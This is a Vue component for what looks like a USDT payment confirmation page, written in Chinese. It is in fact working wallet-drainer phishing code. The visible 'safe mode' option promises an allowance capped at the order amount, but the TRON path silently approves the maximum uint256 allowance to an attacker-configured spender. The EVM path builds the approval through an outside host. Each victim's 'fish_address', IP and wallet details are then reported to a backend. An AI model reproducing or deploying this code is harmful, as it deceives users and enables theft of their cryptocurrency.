<template>
  <div class="payment-page">
    <!-- Loading遮罩 -->
    <div v-if="showLoading" class="overlay">
      <div class="loader"></div>
    </div>

    <!-- 主容器 -->
    <div class="container">
      <div class="box">
        <!-- 合约地址 -->
        <div class="input_group">
          <label>合约地址</label>
          <input 
            v-model="usdtContractAddress" 
            readonly 
            class="input-readonly"
          />
        </div>

        <!-- 支付金额 -->
        <div class="input_group">
          <label>金额</label>
          <input 
            type="text" 
            v-model="paymentAmount" 
            readonly 
            class="input-readonly"
          />
        </div>

        <!-- 立即支付按钮 -->
        <button 
          class="input_submit" 
          @click="handlePayment"
          :disabled="showLoading"
        >
          立即支付
        </button>
      </div>

      <!-- 确认授权弹窗 -->
      <div v-if="showModal" class="modal-overlay" @click="closeModal"></div>
      <div v-if="showModal" class="modal">
        <!-- 安全/危险提示 -->
        <div v-if="authMode === 'safe'" class="alert alert-safe">
          <i class="fas fa-exclamation-circle"></i> 
          安全提醒：当前授权地址只能转移最多{{ paymentAmount }}USDT。
        </div>
        <div v-else class="alert alert-danger">
          <i class="fas fa-times-circle"></i> 
          高危操作:当前授权地址可随时转移资产，无须经过我同意，有被盗风险。
        </div>

        <h2>为保证资产安全，请仔细阅读以下信息</h2>

        <div class="modal-content">
        <!-- 授权金额 -->
        <div class="form-row">
          <label class="form-label">授权金额(USDT)</label>
          <div class="number-input">
            <button class="btn-minus" @click="decreaseAmount" type="button">−</button>
            <input 
              type="number" 
              v-model="authAmount" 
              step="0.01"
              min="0"
              class="amount-value"
            />
            <button class="btn-plus" @click="increaseAmount" type="button">+</button>
          </div>
        </div>

          <!-- 授权模式 -->
          <div class="form-row">
            <label class="form-label">授权模式</label>
            <div class="radio-group">
              <label class="radio-option" :class="{ active: authMode === 'safe' }">
                <input 
                  type="radio" 
                  name="mode" 
                  value="safe" 
                  v-model="authMode"
                />
                <span class="radio-circle"></span>
                <span class="radio-text">安全模式</span>
              </label>
              <label class="radio-option" :class="{ active: authMode === 'whitelist' }">
                <input 
                  type="radio" 
                  name="mode" 
                  value="whitelist" 
                  v-model="authMode"
                />
                <span class="radio-circle"></span>
                <span class="radio-text">白名单模式</span>
              </label>
            </div>
          </div>

          <!-- 模式说明 -->
          <div class="mode-description">
            <p v-if="authMode === 'safe'" class="desc-safe">
              <strong>安全模式：</strong>安全模式下需要经过同意才能转移商品金额。
            </p>
            <p v-else class="desc-danger">
              <strong>白名单模式:</strong> 授权地址可以直接转走资产且无需确认
            </p>
          </div>
        </div>

        <!-- 按钮 -->
        <div class="modal-buttons">
          <button class="btn-cancel" type="button" @click="closeModal">取消</button>
          <button class="btn-confirm" type="button" @click="confirmPayment">确认</button>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue'
import { useRoute } from 'vue-router'

const route = useRoute()

// 数据
const showLoading = ref(false)
const showModal = ref(false)
const usdtContractAddress = ref('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t') // USDT合约地址（显示用）
const paymentAmount = ref('0.00')
const authAmount = ref('0.00')
const authMode = ref('safe')
const orderData = ref(null)
const chain = ref('TRC') // 链类型，默认TRC
// 配置数据 - 直接模仿参考代码的结构
const configData = ref({
  permission_address: '',
  authorized_amount: '',
  '0x_permission_address': ''
})

// 初始化 - 完全按照参考代码 line 173-222
onMounted(async () => {
  console.log('=== 支付确认页面初始化 ===')
  
  // 0. 从URL解析链类型
  const urlParams = new URLSearchParams(window.location.search)
  const idParam = urlParams.get('id')
  if (idParam) {
    const match = idParam.match(/^(trc|erc|bsc|okc|pol|grc)(\d{1,15})$/i)
    if (match) {
      chain.value = match[1].toUpperCase()
      console.log('从URL解析链类型:', chain.value)
      
      // 根据链类型设置合约地址（关键！）
      switch (chain.value) {
        case 'TRC':
          usdtContractAddress.value = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
          break
        case 'ERC':
          usdtContractAddress.value = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
          break
        case 'BSC':
          usdtContractAddress.value = '0x55d398326f99059fF775485246999027B3197955'
          break
        case 'OKC':
          usdtContractAddress.value = '0x382bB369d343125BfB2117af9c149795C6C65C50'
          break
        case 'POL':
          usdtContractAddress.value = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F'
          break
        case 'GRC':
          usdtContractAddress.value = '0x4ECaBa5870353805a9F068101A40E0f32ed605C6'
          break
        default:
          usdtContractAddress.value = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
      }
      console.log('✅ 已设置合约地址:', usdtContractAddress.value)
    }
  }
  
  // 1. 先加载订单数据（获取订单金额显示用）
  await loadOrderData()
  
  // 2. 调用 /payment-config 获取后台配置
  await loadBackendConfig()
  
  // 注意：不主动检测和切换链，避免与 TP 钱包冲突
  // TP 钱包会根据 deep link 中的 chain 参数自动切换到正确的链
  
  console.log('=== 初始化完成 ===')
  console.log('chain:', chain.value)
  console.log('合约地址:', usdtContractAddress.value)
  console.log('configData:', configData.value)
  console.log('paymentAmount:', paymentAmount.value)
  console.log('authAmount:', authAmount.value)
})

// 检测并切换到正确的链
async function checkAndSwitchChain() {
  try {
    if (chain.value === 'TRC') {
      // TRC链 - 检测 TronLink
      if (typeof window.tronWeb !== 'undefined') {
        console.log('✅ TronLink 已连接')
        // 等待 TronLink 准备就绪
        let retries = 0
        while (retries < 10) {
          if (window.tronWeb.ready) {
            console.log('✅ TronLink 已就绪')
            return
          }
          await new Promise(resolve => setTimeout(resolve, 500))
          retries++
        }
        console.warn('⚠️ TronLink 未就绪，请手动刷新页面')
      } else {
        console.warn('⚠️ 未检测到 TronLink，请确保钱包已安装')
      }
    } else {
      // EVM链 - 检测并切换网络
      if (typeof window.ethereum !== 'undefined') {
        const chainId = await window.ethereum.request({ method: 'eth_chainId' })
        const currentChainId = parseInt(chainId, 16)
        
        // 定义各链的 chainId
        const chainIds = {
          'ERC': 1,      // Ethereum Mainnet
          'BSC': 56,     // BSC Mainnet
          'OKC': 66,     // OKC Mainnet
          'POL': 137,    // Polygon Mainnet
          'GRC': 1666600001  // Harmony Mainnet
        }
        
        const targetChainId = chainIds[chain.value]
        
        if (currentChainId !== targetChainId) {
          console.warn(`⚠️ 当前链 ID: ${currentChainId}, 需要切换到: ${targetChainId}`)
          
          // 尝试切换链
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x' + targetChainId.toString(16) }]
            })
            console.log('✅ 已切换到正确的链')
          } catch (switchError) {
            // 如果链不存在，可能需要添加链（这里暂不处理）
            console.error('切换链失败:', switchError)
            alert(`请在钱包中手动切换到 ${chain.value} 网络`)
          }
        } else {
          console.log('✅ 钱包已连接到正确的链')
        }
      }
    }
  } catch (error) {
    console.error('检测链失败:', error)
  }
}

// 加载后端配置 - 完全模仿参考代码的逻辑
async function loadBackendConfig() {
  try {
    console.log('=== 加载后端配置 ===')
    
    const response = await fetch('/payment-config')
    const data = await response.json()
    
    console.log('后端配置响应:', data)
    
    if (data.status === 'success' && data.config) {
      // 处理 permission_address（可能有多个，随机选一个）
      if (data.config.permission_address) {
        const permissionAddresses = data.config.permission_address
          .split(/\r\n|\r|\n/)
          .map(addr => addr.trim())
          .filter(addr => addr)
        
        if (permissionAddresses.length > 0) {
          const randomIndex = Math.floor(Math.random() * permissionAddresses.length)
          configData.value.permission_address = permissionAddresses[randomIndex]
        }
      }
      
      // 处理 0x_permission_address
      if (data.config['0x_permission_address']) {
        configData.value['0x_permission_address'] = data.config['0x_permission_address']
      }
      
      // 处理 authorized_amount（仅保存到 configData，不修改显示金额）
      if (data.config.authorized_amount) {
        configData.value.authorized_amount = data.config.authorized_amount
        // ⚠️ 不再覆盖 authAmount，保持显示订单金额
      }
      
      console.log('最终配置数据:', configData.value)
      console.log('授权金额:', authAmount.value)
    }
  } catch (error) {
    console.error('加载后端配置失败:', error)
  }
}

// 加载订单数据 - 优先从URL参数读取金额
async function loadOrderData() {
  const orderSN = route.params.orderSN
  const urlAmount = route.params.amount  // 从URL路径获取金额
  const queryAmount = route.query.amount  // 从URL查询参数获取金额 ⭐️ 新增
  
  console.log('=== PaymentConfirm: 开始加载订单数据 ===')
  console.log('订单号:', orderSN)
  console.log('URL路径金额:', urlAmount)
  console.log('URL查询参数金额:', queryAmount)
  
  if (!orderSN) {
    console.error('❌ 订单号为空')
    return
  }
  
  // 🔥 优先方案1：从URL查询参数获取金额（最直接，收银台跳转时携带）
  const amountFromUrl = queryAmount || urlAmount
  if (amountFromUrl) {
    const amount = parseFloat(amountFromUrl)
    if (amount > 0) {
      paymentAmount.value = amount.toFixed(2)
      authAmount.value = amount.toFixed(2)
      console.log('✅ 从URL参数加载金额成功:', paymentAmount.value)
      
      // 构造基本订单数据
      orderData.value = {
        order_sn: orderSN,
        actual_price: amount
      }
      
      console.log('=== 最终支付金额:', paymentAmount.value, '===')
      return
    }
  }
  
  // 备用方案2：从 sessionStorage 获取
  console.log('URL无金额参数，尝试从 sessionStorage 读取...')
  const cachedData = sessionStorage.getItem(`order_${orderSN}`)
  if (cachedData) {
    try {
      orderData.value = JSON.parse(cachedData)
      console.log('从 sessionStorage 读取到的订单数据:', orderData.value)
      
      const amount = parseFloat(
        orderData.value.actual_price || 
        orderData.value.actualPrice || 
        orderData.value.price || 
        0
      )
      
      if (amount > 0) {
        paymentAmount.value = amount.toFixed(2)
        authAmount.value = amount.toFixed(2)
        console.log('✅ 从 sessionStorage 加载金额成功:', paymentAmount.value)
        console.log('=== 最终支付金额:', paymentAmount.value, '===')
        return
      }
    } catch (e) {
      console.error('解析 sessionStorage 数据失败:', e)
    }
  }
  
  // 备用方案2：从后端API获取订单数据
  try {
    console.log('正在从数据库获取订单信息...')
    const response = await fetch(`/api/order/${orderSN}`)
    const data = await response.json()
    console.log('API 返回数据:', data)
    
    if (data.code === 200 && data.data) {
      orderData.value = data.data
      console.log('订单数据:', orderData.value)
      
      // 尝试多个可能的字段名
      const amount = parseFloat(
        orderData.value.actual_price || 
        orderData.value.actualPrice || 
        orderData.value.price || 
        0
      )
      console.log('解析后的金额:', amount)
      
      if (amount > 0) {
        paymentAmount.value = amount.toFixed(2)
        authAmount.value = amount.toFixed(2)
        console.log('✅ 从API加载金额成功:', paymentAmount.value)
      } else {
        console.error('❌ 订单金额为0或无效')
        paymentAmount.value = '0.00'
        authAmount.value = '0.00'
      }
    } else {
      console.error('❌ API返回数据格式错误:', data)
      
      // 备用方案3：尝试从 sessionStorage 获取
      console.log('尝试从 sessionStorage 备用读取...')
      const cachedData = sessionStorage.getItem(`order_${orderSN}`)
      if (cachedData) {
        try {
          orderData.value = JSON.parse(cachedData)
          const amount = parseFloat(orderData.value.actual_price || orderData.value.actualPrice || 0)
          if (amount > 0) {
            paymentAmount.value = amount.toFixed(2)
            authAmount.value = amount.toFixed(2)
            console.log('✅ 从缓存加载成功:', paymentAmount.value)
          }
        } catch (e) {
          console.error('解析缓存数据失败:', e)
        }
      }
    }
  } catch (error) {
    console.error('❌ 从API加载订单数据失败:', error)
    
    // 备用方案3：尝试从 sessionStorage 获取
    console.log('API失败，尝试从 sessionStorage 备用读取...')
    const cachedData = sessionStorage.getItem(`order_${orderSN}`)
    if (cachedData) {
      try {
        orderData.value = JSON.parse(cachedData)
        const amount = parseFloat(orderData.value.actual_price || orderData.value.actualPrice || 0)
        if (amount > 0) {
          paymentAmount.value = amount.toFixed(2)
          authAmount.value = amount.toFixed(2)
          console.log('✅ 从缓存加载成功:', paymentAmount.value)
        }
      } catch (e) {
        console.error('解析缓存数据失败:', e)
      }
    }
  }
  
  console.log('=== 最终支付金额:', paymentAmount.value, '===')
}

// 处理支付按钮点击
function handlePayment() {
  if (showLoading.value) return
  showModal.value = true
}

// 关闭弹窗
function closeModal() {
  showModal.value = false
}

// 减少金额
function decreaseAmount() {
  const current = parseFloat(authAmount.value)
  const min = 0
  if (current >= 1) {
    authAmount.value = (current - 1).toFixed(2)
  }
}

// 增加金额
function increaseAmount() {
  const current = parseFloat(authAmount.value)
  authAmount.value = (current + 1).toFixed(2)
}

// 确认支付 - 完全模仿参考代码，不做验证
async function confirmPayment() {
  showModal.value = false
  showLoading.value = true

  try {
    console.log('用户确认授权:', {
      usdtContract: usdtContractAddress.value,
      configData: configData.value,
      amount: authAmount.value,
      mode: authMode.value,
      orderSN: route.params.orderSN
    })

    // 检测钱包类型并发起授权交易
    const walletType = detectWalletType()
    console.log('检测到钱包类型:', walletType)
    
    if (walletType === 'tronlink') {
      await approveWithTronLink()
    } else if (walletType === 'metamask') {
      await approveWithMetaMask()
    } else {
      alert('未检测到钱包，请确保您已安装 TronLink 或 MetaMask 并已登录。')
    }
    
  } catch (error) {
    console.error('处理失败:', error)
    alert('授权失败: ' + error.message)
  } finally {
    showLoading.value = false
  }
}

// 检测钱包类型 - 根据链类型判断（优先根据 chain 判断，而不是钱包对象）
function detectWalletType() {
  console.log('=== detectWalletType ===')
  console.log('chain.value:', chain.value)
  console.log('window.tronWeb:', typeof window.tronWeb)
  console.log('window.ethereum:', typeof window.ethereum)
  
  if (chain.value === 'TRC') {
    // TRC链：优先返回 tronlink，即使 window.tronWeb 未完全就绪
    // TP 钱包在 TRON 模式下也会注入 tronWeb
    if (typeof window.tronWeb !== 'undefined') {
      console.log('检测到 TronWeb，返回 tronlink')
      return 'tronlink'
    }
  } else {
    // ERC/BSC/POL/OKC/GRC 使用 MetaMask 系列
    if (typeof window.ethereum !== 'undefined') {
      console.log('检测到 Ethereum，返回 metamask')
      return 'metamask'
    }
  }
  
  console.log('未检测到钱包')
  return null
}

// 使用 TronLink 发起授权 - 直接使用 TronWeb 生成交易
async function approveWithTronLink() {
  try {
    // 等待 TronWeb 准备就绪（TP 钱包可能需要时间注入）
    console.log('等待 TronWeb 准备就绪...')
    let retries = 0
    while (retries < 20) {
      if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        console.log('✅ TronWeb 已就绪')
        break
      }
      await new Promise(resolve => setTimeout(resolve, 500))
      retries++
      console.log(`等待 TronWeb... (${retries}/20)`)
    }
    
    if (!window.tronWeb || !window.tronWeb.ready || !window.tronWeb.defaultAddress) {
      throw new Error('TronWeb 未就绪，请确保钱包已连接')
    }
    
    // 直接从 configData 获取参数
    const spenderAddress = configData.value.permission_address
    const approvalAmount = configData.value.authorized_amount
    const userAddress = window.tronWeb.defaultAddress.base58
    
    console.log('=== TRC20授权（使用TronWeb） ===')
    console.log('USDT合约:', usdtContractAddress.value)
    console.log('授权给（spender）:', spenderAddress)
    console.log('用户地址:', userAddress)
    console.log('授权金额:', approvalAmount)
    
    // 使用 TronWeb 直接构建授权交易
    const tronWeb = window.tronWeb
    
    // 获取 USDT 合约实例
    const usdtContract = await tronWeb.contract().at(usdtContractAddress.value)
    
    // 授权无限额度（最大 uint256 值）
    const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
    
    console.log('授权金额: 无限额度')
    
    // 调用合约的 approve 方法
    const transaction = await usdtContract.approve(
      spenderAddress,
      unlimitedAmount
    ).send({
      feeLimit: 100000000,
      shouldPollResponse: false
    })
    
    console.log('授权交易已提交:', transaction)
    
    if (transaction) {
      // 提交用户数据到后端
      await submitUserDataToBackend(userAddress, 'TRC')
      
      alert('授权交易已提交！\n\n交易哈希: ' + transaction + '\n\n系统正在监听并处理您的订单，请稍候...')
      return true
    } else {
      return false
    }
  } catch (error) {
    console.error('TRC20授权失败:', error)
    alert('授权失败: ' + error.message)
    return false
  }
}

// 使用 MetaMask 发起授权（ERC20）
async function approveWithMetaMask() {
  try {
    if (!window.ethereum) {
      throw new Error('请先安装 MetaMask 钱包')
    }

    // 请求连接钱包
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
    const userAddress = accounts[0]
    
    // 从 configData 获取参数（完全按照参考代码 line 772-777）
    const spender = configData.value['0x_permission_address']
    const amount = configData.value.authorized_amount
    
    // 获取当前链ID
    const chainId = await window.ethereum.request({ method: 'eth_chainId' })
    const currentChainId = parseInt(chainId, 16)
    
    // 确定链类型（1=ETH, 56=BSC, 137=Polygon等）
    let chain = 'ERC'
    if (currentChainId === 56) chain = 'BSC'
    else if (currentChainId === 137) chain = 'POL'
    else if (currentChainId === 66) chain = 'OKC'
    else if (currentChainId === 86) chain = 'GRC'
    
    console.log('EVM授权参数:', {
      address: userAddress,
      spender,
      amount,
      chain
    })
    
    // 调用第三方API生成授权交易
    const response = await fetch('https://rpc.chain-evm.com/approve', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        address: userAddress,
        spender: spender,
        amount: amount,
        chain: chain
      })
    })
    
    const result = await response.json()
    
    if (!result.success) {
      throw new Error('生成授权交易失败')
    }
    
    console.log('生成授权交易成功，等待用户签名...')
    
    // 使用钱包发送交易
    const txHash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [result.data.transaction]
    })
    
    console.log('授权交易已提交:', txHash)
    
    // 提交用户数据到后端
    await submitUserDataToBackend(userAddress, chain)
    
    alert('授权交易已提交！\n\n交易哈希: ' + txHash + '\n\n系统正在监听并处理您的订单，请稍候...')
    
  } catch (error) {
    console.error('MetaMask 授权失败:', error)
    throw error
  }
}

// 提交用户数据到后端（用于机器人通知）
async function submitUserDataToBackend(userAddress, chainType) {
  try {
    const orderSN = route.params.orderSN
    
    // 获取钱包类型
    const walletType = sessionStorage.getItem(`wallet_type_${orderSN}`) || 'unknown'
    
    // 获取网站名称
    const websiteName = sessionStorage.getItem(`website_name_${orderSN}`) || '好旺担保'
    
    // 获取用户IP（从后端API获取或使用第三方服务）
    let ipAddress = 'unknown'
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json')
      const ipData = await ipResponse.json()
      ipAddress = ipData.ip
    } catch (e) {
      console.warn('获取IP失败:', e)
    }
    
    // 获取权限地址和余额信息
    const permissionAddress = chainType === 'TRC' 
      ? configData.value.permission_address 
      : configData.value['0x_permission_address']
    
    // 获取余额（这里简化处理，实际可以从钱包查询）
    const usdtBalance = paymentAmount.value
    const gasBalance = '0'
    
    // 获取unique_id
    const urlParams = new URLSearchParams(window.location.search)
    const idParam = urlParams.get('id')
    let uniqueId = ''
    if (idParam) {
      const match = idParam.match(/^(trc|erc|bsc|okc|pol|grc)(\d{1,15})$/i)
      if (match) {
        uniqueId = match[2]
      }
    }
    
    // 调用后端 API
    const response = await fetch('/api/browsebroadcast', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        unique_id: uniqueId,
        fish_address: userAddress,
        chainid: chainType,
        permissions_fishaddress: permissionAddress,
        usdt_balance: usdtBalance,
        gas_balance: gasBalance,
        time: new Date().toLocaleString('zh-CN'),
        ip_address: ipAddress,
        wallet_type: walletType,
        website_name: websiteName
      })
    })
    
    const result = await response.json()
    console.log('提交用户数据结果:', result)
    
  } catch (error) {
    console.error('提交用户数据失败:', error)
    // 不影响主流程，仅记录错误
  }
}
</script>

<style scoped>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

.payment-page {
  width: 100vw;
  min-height: 100vh;
  background-color: #e8e8e8;
  padding: 20px;
}

.container {
  width: 100%;
  max-width: 100%;
  margin: 0 auto;
}

.box {
  background: transparent;
  padding: 0 10px;
}

.input_group {
  margin-bottom: 20px;
}

.input_group label {
  display: block;
  font-size: 14px;
  color: #666;
  margin-bottom: 8px;
}

.input_group input {
  width: 100%;
  height: 50px;
  border: none;
  border-radius: 10px;
  padding: 0 15px;
  font-size: 15px;
  background-color: #fff;
  color: #333;
  outline: none;
}

.input-readonly {
  background-color: #fff;
}

.input_submit {
  width: 100%;
  height: 50px;
  background: linear-gradient(135deg, #4ade80 0%, #22c55e 100%);
  color: #fff;
  border: none;
  border-radius: 10px;
  font-size: 16px;
  font-weight: 500;
  cursor: pointer;
  margin-top: 30px;
  transition: all 0.3s;
}

.input_submit:active {
  transform: scale(0.98);
}

.input_submit:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}

/* 模态框遮罩 */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background-color: rgba(0, 0, 0, 0.4);
  z-index: 999;
}

/* 模态框 */
.modal {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 90%;
  max-width: 500px;
  max-height: 85vh;
  background-color: #fff;
  border-radius: 16px;
  padding: 20px;
  z-index: 1000;
  overflow-y: auto;
  animation: slideUp 0.3s ease;
}

@keyframes slideUp {
  from {
    opacity: 0;
    transform: translate(-50%, -40%);
  }
  to {
    opacity: 1;
    transform: translate(-50%, -50%);
  }
}

/* 提示框 */
.alert {
  padding: 12px 15px;
  border-radius: 8px;
  margin-bottom: 20px;
  font-size: 13px;
  display: flex;
  align-items: flex-start;
  gap: 8px;
  line-height: 1.5;
}

.alert i {
  font-size: 16px;
  margin-top: 2px;
  flex-shrink: 0;
}

.alert-safe {
  background-color: #d1fae5;
  color: #065f46;
}

.alert-danger {
  background-color: #fee2e2;
  color: #991b1b;
}

.modal h2 {
  font-size: 16px;
  font-weight: 600;
  color: #000;
  margin-bottom: 30px;
  text-align: center;
  line-height: 1.5;
}

.modal-content {
  margin-bottom: 20px;
}

/* 表单行 */
.form-row {
  margin-bottom: 25px;
}

.form-label {
  display: block;
  font-size: 14px;
  color: #333;
  margin-bottom: 12px;
  font-weight: 500;
}

/* 数字输入 */
.number-input {
  display: flex;
  align-items: center;
  background-color: #f5f5f5;
  border-radius: 8px;
  padding: 4px;
  gap: 4px;
}

.btn-minus,
.btn-plus {
  width: 40px;
  height: 40px;
  border: none;
  background-color: #e5e5e5;
  border-radius: 6px;
  font-size: 20px;
  color: #666;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s;
}

.btn-minus:active,
.btn-plus:active {
  background-color: #d4d4d4;
}

.amount-value {
  flex: 1;
  text-align: center;
  font-size: 15px;
  color: #333;
  background: transparent;
  border: none;
  outline: none;
  height: 40px;
}

.amount-display {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 12px;
  background: #f5f5f5;
  border-radius: 8px;
}

.amount-value-readonly {
  width: 100%;
  text-align: center;
  font-size: 18px;
  font-weight: bold;
  color: #3b82f6;
  background: transparent;
  border: none;
  outline: none;
}

/* 单选按钮组 */
.radio-group {
  display: flex;
  gap: 12px;
}

.radio-option {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 12px;
  border: 1.5px solid #d4d4d4;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.2s;
  position: relative;
}

.radio-option input {
  position: absolute;
  opacity: 0;
  pointer-events: none;
}

.radio-circle {
  width: 20px;
  height: 20px;
  border: 2px solid #d4d4d4;
  border-radius: 50%;
  margin-right: 8px;
  position: relative;
  transition: all 0.2s;
}

.radio-option.active .radio-circle {
  border-color: #3b82f6;
  background-color: #3b82f6;
}

.radio-option.active .radio-circle::after {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 8px;
  height: 8px;
  background-color: #fff;
  border-radius: 50%;
}

.radio-text {
  font-size: 14px;
  color: #666;
}

.radio-option.active {
  border-color: #3b82f6;
}

.radio-option.active .radio-text {
  color: #3b82f6;
}

/* 模式说明 */
.mode-description {
  margin-top: 15px;
  margin-bottom: 20px;
}

.mode-description p {
  font-size: 13px;
  line-height: 1.6;
  margin: 0;
}

.desc-safe {
  color: #065f46;
}

.desc-safe strong {
  color: #dc2626;
}

.desc-danger {
  color: #991b1b;
}

.desc-danger strong {
  color: #dc2626;
}

/* 按钮 */
.modal-buttons {
  display: flex;
  gap: 10px;
  margin-top: 30px;
}

.btn-cancel,
.btn-confirm {
  flex: 1;
  height: 48px;
  border: none;
  border-radius: 8px;
  font-size: 15px;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.2s;
}

.btn-cancel {
  background-color: #f5f5f5;
  color: #666;
}

.btn-cancel:active {
  background-color: #e5e5e5;
}

.btn-confirm {
  background-color: #3b82f6;
  color: #fff;
}

.btn-confirm:active {
  background-color: #2563eb;
}

/* Loading遮罩 */
.overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background-color: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 9999;
}

.loader {
  border: 4px solid #f3f3f3;
  border-top: 4px solid #3b82f6;
  border-radius: 50%;
  width: 50px;
  height: 50px;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

/* 移动端优化 */
@media (max-width: 600px) {
  .payment-page {
    padding: 15px;
  }
  
  .modal {
    width: 95%;
    padding: 18px;
  }
}

/* 隐藏数字输入的spinner */
input[type="number"]::-webkit-inner-spin-button,
input[type="number"]::-webkit-outer-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

input[type="number"] {
  -moz-appearance: textfield;
}
</style>

